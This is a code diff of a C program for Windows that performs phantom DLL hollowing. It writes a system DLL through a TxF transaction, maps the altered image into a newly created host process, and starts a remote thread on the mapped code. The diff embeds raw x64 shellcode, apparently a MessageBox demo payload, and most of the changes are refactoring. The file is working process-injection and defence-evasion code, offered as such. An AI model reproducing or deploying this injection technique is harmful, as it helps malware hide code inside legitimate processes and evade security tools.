@@ -7,14 +7,13 @@
 //
 // Definitions
 //
-
+// ReSharper disable CppInconsistentNaming
 typedef struct MY_CLIENT_ID
 {
 	PVOID UniqueProcess;
 	PVOID UniqueThread;
 } MY_CLIENT_ID, * MY_PCLIENT_ID;
 
-// ReSharper disable CppInconsistentNaming
 typedef NTSTATUS(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
 typedef NTSTATUS(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
 typedef NTSTATUS(__stdcall* NTCREATETRANSACTION)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
@@ -25,10 +24,11 @@ typedef NTSTATUS(__stdcall* NTCLOSE)(HANDLE);
 BOOL CheckRelocRange(PBYTE pRelocBuf, UINT dwStartRVA, UINT dwEndRVA);
 PVOID GetPAFromRVA(PBYTE pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, UINT64 qwRVA);
 
+typedef void(*fnAddr)(VOID);
+
 //
 // Hollower logic
 //
-
 INT main() {
 	NTSTATUS				ntStatus;
 	STARTUPINFOA			startupInfo;
@@ -43,7 +43,7 @@ INT main() {
 	HANDLE					hFind;
 	HANDLE					hProcess;
 	HANDLE					hToken;
-	HANDLE					hTread;
+	HANDLE					hTread = NULL;
 	BOOL					bMapped = FALSE;
 	BOOL					bIsElevated = FALSE;
 	BYTE					bMessageboxShellcode64[] = "\x48\x89\x5C\x24\x18\x48\x89\x7C\x24\x20\x55\x48\x8D\x6C\x24\xA9\x48\x81\xEC\xA0\x00\x00\x00\x33\xDB\xC7\x45\x17\x75\x00\x73\x00\xB9\x13\x9C\xBF\xBD\x48\x89\x5D\x67\x89\x5D\xFB\x89\x5D\x0B\x66\x89\x5D\x47\xC7\x45\x1B\x65\x00\x72\x00\xC7\x45\x1F\x33\x00\x32\x00\xC7\x45\x23\x2E\x00\x64\x00\xC7\x45\x27\x6C\x00\x6C\x00\xC7\x45\xD7\x4D\x65\x73\x73\xC7\x45\xDB\x61\x67\x65\x42\xC7\x45\xDF\x6F\x78\x57\x00\xC7\x45\x2F\x48\x00\x65\x00\xC7\x45\x33\x6C\x00\x6C\x00\xC7\x45\x37\x6F\x00\x20\x00\xC7\x45\x3B\x57\x00\x6F\x00\xC7\x45\x3F\x72\x00\x6C\x00\xC7\x45\x43\x64\x00\x21\x00\xC7\x45\xE7\x44\x00\x65\x00\xC7\x45\xEB\x6D\x00\x6F\x00\xC7\x45\xEF\x21\x00\x00\x00\xE8\x74\x00\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x67\x00\x00\x00\x48\x8B\xF8\xC7\x45\xF7\x14\x00\x14\x00\x48\x8D\x45\x17\x33\xD2\x4C\x8D\x4D\x6F\x48\x89\x45\xFF\x4C\x8D\x45\xF7\x33\xC9\xFF\xD3\x48\x8B\x4D\x6F\x48\x8D\x45\xD7\x45\x33\xC0\x48\x89\x45\x0F\x4C\x8D\x4D\x67\xC7\x45\x07\x0C\x00\x0C\x00\x48\x8D\x55\x07\xFF\xD7\x45\x33\xC9\x4C\x8D\x45\xE7\x48\x8D\x55\x2F\x33\xC9\xFF\x55\x67\x4C\x8D\x9C\x24\xA0\x00\x00\x00\x49\x8B\x5B\x20\x49\x8B\x7B\x28\x49\x8B\xE3\x5D\xC3\xCC\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3";
@@ -59,7 +59,6 @@ INT main() {
 	//
 	// Load required functions from ntdll
 	//
-
 	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
 	pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
 	pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
@@ -73,8 +72,6 @@ INT main() {
 	//
 	// Check if elevated
 	//
-
-	// Check if ran with elevated privileges
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
 		TOKEN_ELEVATION Elevation;
 		DWORD cbSize = sizeof(TOKEN_ELEVATION);
@@ -89,7 +86,6 @@ INT main() {
 	//
 	// Create host process
 	//
-
 	ZeroMemory(&startupInfo, sizeof startupInfo);
 	startupInfo.cb = sizeof startupInfo;
 	ZeroMemory(&processInformation, sizeof processInformation);
@@ -107,7 +103,6 @@ INT main() {
 	//
 	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
 	//
-
 	GetSystemDirectoryW(cSysDir, MAX_PATH);
 	wcscat_s(cSearchFilePath, MAX_PATH, cSysDir);
 	wcscat_s(cSearchFilePath, MAX_PATH, L"\\*.dll");
@@ -119,9 +114,9 @@ INT main() {
 			HANDLE					hSection = NULL;
 			WCHAR					cFilePath[MAX_PATH];
 			WCHAR					cTempFilePath[MAX_PATH];
-			WCHAR* cpTargetFile;
+			WCHAR					(*cpTargetFile)[MAX_PATH];
 			PBYTE					pFileBuf;
-			OBJECT_ATTRIBUTES		objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+			OBJECT_ATTRIBUTES		objAttr = { sizeof(OBJECT_ATTRIBUTES) };																// NOLINT(clang-diagnostic-missing-field-initializers)
 			UINT					dwBytesRead = 0;
 			BOOL					bTxF_Valid = FALSE;
 			UINT					dwCodeRva = 0;
@@ -162,7 +157,7 @@ INT main() {
 			}
 
 			hFile = CreateFileTransactedW(
-				cpTargetFile,
+				(CONST WCHAR*)cpTargetFile,
 				GENERIC_WRITE | GENERIC_READ,
 				0,
 				NULL,
@@ -174,7 +169,7 @@ INT main() {
 				NULL
 			);
 			if (hFile == INVALID_HANDLE_VALUE) {
-				printf("[-] Failed to open handle to %ws (error %lu)\r\n", cpTargetFile, GetLastError());
+				printf("[-] Failed to open handle to %ws (error %lu)\r\n", (CONST WCHAR*)cpTargetFile, GetLastError());
 				continue;
 			}
 
@@ -187,9 +182,9 @@ INT main() {
 
 			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
 
-			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
-			IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
-			IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((PBYTE)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));
+			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;																				// NOLINT(clang-diagnostic-cast-align)
+			IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);															// NOLINT(clang-diagnostic-cast-align)
+			IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((PBYTE)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));				// NOLINT(clang-diagnostic-cast-align)
 
 			if (pNtHdrs->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
 				goto IterNext;
@@ -199,19 +194,16 @@ INT main() {
 				//
 				// Found a DLL with sufficient image size: map an image view of it for hollowing.
 				//
-
-				printf("[*] %ws - image size: %lu - .text size: %lu\r\n", wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);
+				printf("[*] %ws - image size: %lu - text size: %lu\r\n", wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);
 
 				//
 				// For TxF, make the modifications to the file contents now prior to mapping.
 				//
-
 				UINT dwBytesWritten = 0;
 
 				//
 				// Wipe the data directories that conflict with the code section
 				//
-
 				for (UINT dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
 					if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
 						pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
@@ -222,7 +214,6 @@ INT main() {
 				//
 				// Find a range free of relocations large enough to accomodate the code.
 				//
-
 				BOOL bRangeFound = FALSE;
 				PBYTE pRelocBuf = (PBYTE)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
@@ -266,7 +257,7 @@ INT main() {
 			}
 
 			qwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
-			ntStatus = pNtMapViewOfSection(hSection, hProcess, &pMapBuf, 0, 0, NULL, &qwMapBufSize, 2, 0, PAGE_EXECUTE_READ); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
+			ntStatus = pNtMapViewOfSection(hSection, hProcess/*GetCurrentProcess()*/, (PVOID)&pMapBuf, 0, 0, NULL, &qwMapBufSize, 2, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
 			if (NT_SUCCESS(ntStatus)) {
 				if (qwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) {
 					printf("[*] %ws - mapped size: %I64u\r\n", wfd.cFileName, qwMapBufSize);
@@ -305,13 +296,15 @@ INT main() {
 		FindClose(hFind);
 	}
 
-	ntStatus = pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, pMapBuf, NULL, &hTread, NULL);
+	ntStatus = pRtlCreateUserThread(hProcess/*GetCurrentProcess()*/, NULL, FALSE, 0, 0, 0, pMappedCode, NULL, &hTread, NULL);
 	if (NT_SUCCESS(ntStatus)) {
 		puts("[+] Successfully started a thread in the remote process");
 	}
 	else {
 		printf("[-] Failed to create a thread in target process (error 0x%lx)\r\n", ntStatus);
 	}
+
+	//((fnAddr)pMappedCode)();
 
 Cleanup:
 	if (processInformation.hProcess) {
@@ -327,7 +320,6 @@ Cleanup:
 //
 // Helpers
 //
-
 IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, UINT64 qwRVA) {
 	for (UINT dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
 		IMAGE_SECTION_HEADER* pCurrentSectHdr = pInitialSectHeader;
